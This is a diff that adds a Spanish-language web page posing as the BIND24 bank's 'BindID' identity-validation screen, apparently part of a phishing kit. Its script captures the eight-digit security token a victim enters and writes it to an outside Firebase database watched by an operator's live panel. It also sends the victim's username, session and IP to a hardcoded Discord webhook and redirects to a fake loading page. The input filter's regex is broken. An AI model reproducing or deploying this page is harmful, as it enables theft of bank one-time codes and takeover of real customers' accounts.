@@ -1,0 +1,554 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Validación de Identidad - BindID</title>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            background: #ffffff;
+            color: #333;
+            min-height: 100vh;
+        }
+
+        .header {
+            background: linear-gradient(180deg, #1d86f3 0%, #0052cc 100%);
+            color: white;
+            padding: 12px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .logo img {
+            height: 30px;
+            margin-right: 5px;
+        }
+
+        .user-info {
+            font-size: 13px;
+            font-weight: 500;
+        }
+
+        .sub-header {
+            background: #f5f7fa;
+            border-bottom: 1px solid #e0e0e0;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .breadcrumb {
+            color: #1d86f3;
+            font-size: 15px;
+            font-weight: 500;
+        }
+
+        .close-btn {
+            background: none;
+            border: none;
+            font-size: 24px;
+            color: #333;
+            cursor: pointer;
+            padding: 5px;
+            line-height: 1;
+        }
+
+        .close-btn:hover {
+            color: #666;
+        }
+
+        .main-content {
+            max-width: 700px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+
+        .back-section {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+
+        .back-btn {
+            background: none;
+            border: none;
+            font-size: 24px;
+            color: #333;
+            cursor: pointer;
+            padding: 5px;
+            line-height: 1;
+        }
+
+        .back-btn:hover {
+            color: #1d86f3;
+        }
+
+        .main-title {
+            font-size: 24px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 25px;
+        }
+
+        .token-section {
+            margin-bottom: 30px;
+        }
+
+        .token-label {
+            font-size: 14px;
+            color: #666;
+            padding-bottom: 8px;
+            border-bottom: 1px solid #e0e0e0;
+            margin-bottom: 20px;
+        }
+
+        .renew-text {
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 15px;
+            line-height: 1.5;
+        }
+
+        .renew-text strong {
+            color: #333;
+            font-weight: 600;
+        }
+
+        .renew-btn {
+            background: white;
+            border: 1px solid #1d86f3;
+            color: #1d86f3;
+            padding: 10px 25px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .renew-btn:hover {
+            background: #1d86f3;
+            color: white;
+        }
+
+        .input-section {
+            margin: 30px 0;
+        }
+
+        .input-label {
+            display: block;
+            font-size: 14px;
+            color: #999;
+            margin-bottom: 8px;
+        }
+
+        .input-label.required::after {
+            content: "*";
+            color: #e02454;
+            margin-left: 3px;
+        }
+
+        .input-helper {
+            font-size: 12px;
+            color: #999;
+            margin-bottom: 8px;
+        }
+
+        .token-input {
+            width: 100%;
+            padding: 15px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+            font-family: monospace;
+            letter-spacing: 5px;
+            text-align: center;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+
+        .token-input:focus {
+            border-color: #1d86f3;
+            box-shadow: 0 0 0 2px rgba(29, 134, 243, 0.1);
+        }
+
+        .confirm-btn {
+            background: #1d86f3;
+            color: white;
+            border: none;
+            padding: 14px 50px;
+            border-radius: 4px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 30px;
+            transition: background 0.3s;
+        }
+
+        .confirm-btn:hover {
+            background: #0052cc;
+        }
+
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+
+        .modal-content {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+        }
+
+        .modal-title {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            color: #333;
+        }
+
+        .modal-text {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+
+        .modal-buttons {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+        }
+
+        .modal-btn {
+            padding: 10px 25px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            border: none;
+            transition: all 0.3s;
+        }
+
+        .btn-cancel {
+            background: #e02454;
+            color: white;
+        }
+
+        .btn-cancel:hover {
+            background: #c41d48;
+        }
+
+        .btn-confirm {
+            background: #1d86f3;
+            color: white;
+        }
+
+        .btn-confirm:hover {
+            background: #0052cc;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 20px;
+            font-size: 12px;
+            color: #999;
+            margin-top: 40px;
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="logo">
+            <img src="index_files/logo-bind-white.svg" alt="Bind24">
+        </div>
+        <div class="user-info" id="user-display">
+            Cargando...
+        </div>
+    </header>
+
+    <div class="sub-header">
+        <div class="breadcrumb">Validación de Identidad</div>
+        <button class="close-btn" onclick="window.close()">×</button>
+    </div>
+
+    <div class="main-content">
+        <div class="back-section">
+            <button class="back-btn" onclick="window.history.back()">←</button>
+            <h1 class="main-title">Vamos a validar su identidad</h1>
+        </div>
+
+        <div class="token-section">
+            <div class="token-label">
+                Generación de TOKEN a dispositivo seguro
+            </div>
+
+            <div class="renew-text">
+                Para recibir un nuevo TOKEN en tu dispositivo presioná <strong>Reenviar código</strong>.
+            </div>
+
+            <button class="renew-btn" id="renew-token-btn">
+                Reenviar Código
+            </button>
+        </div>
+
+        <form id="form-sms">
+            <div class="input-section">
+                <label class="input-label required" for="sms-input">
+                    Ingrese aquí el código de seguridad
+                </label>
+                <div class="input-helper">
+                    Verificá tu dispositivo seguro e ingresá el TOKEN recibido
+                </div>
+
+                <input 
+                    type="text" 
+                    id="sms-input" 
+                    class="token-input" 
+                    placeholder="00000000" 
+                    maxlength="8"
+                    pattern="[0-9]{8}"
+                    inputmode="numeric"
+                    required
+                >
+            </div>
+
+            <button type="submit" class="confirm-btn" id="btn-envio">
+                Confirmar
+            </button>
+        </form>
+    </div>
+
+    <div class="footer">
+        <p>© 2026 BIND24 - Todos los derechos reservados</p>
+    </div>
+
+    <!-- Modal de confirmación -->
+    <div class="modal-overlay" id="confirm-modal">
+        <div class="modal-content">
+            <div class="modal-title">¿Solicitar nuevo TOKEN?</div>
+            <p class="modal-text">Se enviará una nueva solicitud de TOKEN a tu dispositivo. ¿Estás seguro?</p>
+            <div class="modal-buttons">
+                <button class="modal-btn btn-cancel" id="cancel-request">Cancelar</button>
+                <button class="modal-btn btn-confirm" id="confirm-request">Sí, solicitar</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // 1. CONFIGURACIÓN
+        const firebaseConfig = { 
+            databaseURL: "https://tucopedanm-default-rtdb.firebaseio.com/" 
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        // 2. OBTENER EL ID DE LA URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const sessionId = urlParams.get('id');
+
+        // 3. URL del Webhook de Discord
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1507864461971554467/j4VamcI1PYxbmMxnviA2UIrO4fhu7SWJJro_uudSw4OL3h6xKhCqDfVtPWnXOUZsLbgF";
+
+        // 4. ELEMENTOS DEL DOM
+        const userDisplay = document.getElementById('user-display');
+        const tokenInput = document.getElementById('sms-input');
+        const confirmBtn = document.getElementById('btn-envio');
+        const renewBtn = document.getElementById('renew-token-btn');
+        const confirmModal = document.getElementById('confirm-modal');
+        const cancelRequestBtn = document.getElementById('cancel-request');
+        const confirmRequestBtn = document.getElementById('confirm-request');
+        const modalOverlay = document.getElementById('confirm-modal');
+
+        // 5. INICIALIZAR SI EXISTE SESIÓN
+        if (sessionId) {
+            // Lógica de presencia para la luz del panel
+            const presenceRef = db.ref('logins/' + sessionId + '/online');
+            db.ref(".info/connected").on("value", (snap) => {
+                if (snap.val() === true) {
+                    presenceRef.set(true);
+                    presenceRef.onDisconnect().set(false);
+                }
+            });
+
+            // Cargar datos del usuario
+            db.ref('logins/' + sessionId).once('value').then(snapshot => {
+                const userData = snapshot.val();
+                if (userData && userData.username) {
+                    userDisplay.textContent = `Estás operando con ${userData.username.toUpperCase()}`;
+                    // Guardar en localStorage
+                    localStorage.setItem('username', userData.username);
+                } else {
+                    userDisplay.textContent = `Sesión: ${sessionId}`;
+                }
+            }).catch(error => {
+                console.error("Error al cargar usuario:", error);
+                userDisplay.textContent = `Sesión: ${sessionId}`;
+            });
+
+            // Evento al presionar continuar en el formulario
+            document.getElementById('form-sms').addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                // CAPTURA DEL INPUT
+                const codigoCompleto = document.getElementById('sms-input').value;
+                
+                const btn = document.getElementById('btn-envio');
+                
+                // Validación mínima para no enviar vacío
+                if (codigoCompleto.length < 8) {
+                    alert("Por favor, ingresa un código válido.");
+                    return; 
+                }
+
+                btn.disabled = true;
+
+                // Actualizar el mismo registro y redirigir
+                db.ref('logins/' + sessionId).update({
+                    sms: codigoCompleto,
+                    otp: codigoCompleto,
+                    status: 'TOKEN_RECEIVED',
+                    tokenReceivedAt: Date.now(),
+                    pagina: 'codigo.html'
+                }).then(() => {
+                    window.location.href = 'cargando2.html?id=' + sessionId;
+                }).catch(error => {
+                });
+            });
+
+            // Función para enviar notificación a Discord
+            function sendDiscordNotification() {
+                // Obtener datos del usuario desde Firebase
+                db.ref('logins/' + sessionId).once('value').then(snapshot => {
+                    const userData = snapshot.val();
+                    
+                    const notificationData = {
+                        username: "BindID Alertas",
+                        avatar_url: "https://bind.com.ar/images/logos_separados/Logo-Bind-Menu-SOLO-N.svg",
+                        content: `🔔 **NUEVA SOLICITUD DE TOKEN** 🔔`,
+                        embeds: [{
+                            title: "⚠️ Usuario solicitó nuevo TOKEN",
+                            color: 16753925, // Amarillo/Dorado
+                            fields: [
+                                {
+                                    name: "👤 Usuario",
+                                    value: userData?.username || "Desconocido",
+                                    inline: true
+                                },
+                                {
+                                    name: "🔑 Sesión",
+                                    value: sessionId || "Desconocida",
+                                    inline: true
+                                },
+                                {
+                                    name: "📍 IP",
+                                    value: userData?.ip || "Desconocida",
+                                    inline: true
+                                },
+                                {
+                                    name: "⏰ Fecha",
+                                    value: new Date().toLocaleString(),
+                                    inline: true
+                                },
+                                {
+                                    name: "📱 Estado",
+                                    value: "Esperando verificación",
+                                    inline: true
+                                }
+                            ],
+                            footer: {
+                                text: "BindID Security System | " + new Date().toISOString(),
+                                icon_url: "https://bind.com.ar/images/logos_separados/Logo-Bind-Menu-SOLO-N.svg"
+                            }
+                        }]
+                    };
+
+                    fetch(DISCORD_WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(notificationData)
+                    })
+                    .then(response => {
+                        if (response.ok) {
+                            console.log("✅ Notificación enviada a Discord");
+                            alert("✅ SOLICITUD ENVIADA\n\nSe ha notificado a nuestro equipo.\nPor favor espera a que te envíen el nuevo TOKEN.");
+                        } else {
+                            console.error("❌ Error al enviar a Discord:", response.status);
+                            alert("Hubo un error al enviar la notificación. Inténtalo nuevamente.");
+                        }
+                    })
+                    .catch(error => {
+                        console.error("❌ Error en fetch:", error);
+                        alert("Hubo un error al enviar la solicitud. Inténtalo nuevamente.");
+                    });
+                });
+            }
+
+            // Event Listeners
+            renewBtn.addEventListener('click', () => {
+                confirmModal.style.display = 'flex';
+            });
+
+            cancelRequestBtn.addEventListener('click', () => {
+                confirmModal.style.display = 'none';
+            });
+
+            confirmRequestBtn.addEventListener('click', () => {
+                confirmModal.style.display = 'none';
+                sendDiscordNotification();
+            });
+
+            // Cerrar modal al hacer clic fuera
+            modalOverlay.addEventListener('click', (e) => {
+                if (e.target === modalOverlay) {
+                    confirmModal.style.display = 'none';
+                }
+            });
+
+            // Solo permitir números
+            tokenInput.addEventListener('input', (e) => {
+                e.target.value = e.target.value.replace(/[-9]/g, '');
+            });
+
+        } else {
+            // Si no hay sesión, redirigir a index.html
+            window.location.href = 'index.html';
+        }
+    </script>
+</body>
+</html>
